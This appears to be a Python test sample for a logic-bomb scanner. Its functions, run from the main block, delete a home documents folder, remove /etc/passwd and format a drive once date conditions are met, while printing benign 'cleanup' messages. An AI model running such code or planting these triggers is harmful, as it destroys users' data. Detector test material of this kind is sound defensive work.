#!/usr/bin/env python3
"""
Test file with SCHEDULED_THREAT patterns
This file contains time-based logic bombs that trigger on specific dates
"""

import datetime
import os
import shutil

# SCHEDULED_THREAT - Time-based trigger
def check_system_date():
    current_date = datetime.datetime.now()
    if current_date.year >= 2025:
        # Malicious action triggered by date
        shutil.rmtree('/home/user/documents')
        print("System cleanup completed")

# SCHEDULED_THREAT - Another time-based trigger
def maintenance_task():
    import time
    current_time = time.time()
    if current_time > 1735689600:  # Unix timestamp for 2025
        # Delete important files
        os.remove('/etc/passwd')
        print("Maintenance completed")

# SCHEDULED_THREAT - Month-based trigger
def monthly_cleanup():
    current_month = datetime.datetime.now().month
    if current_month == 12:
        # Format the entire disk
        os.system('format c: /q')
        print("Year-end cleanup")

# Normal function (not a threat)
def safe_function():
    print("This is a safe function")
    return True

if __name__ == "__main__":
    check_system_date()
    maintenance_task()
    monthly_cleanup() 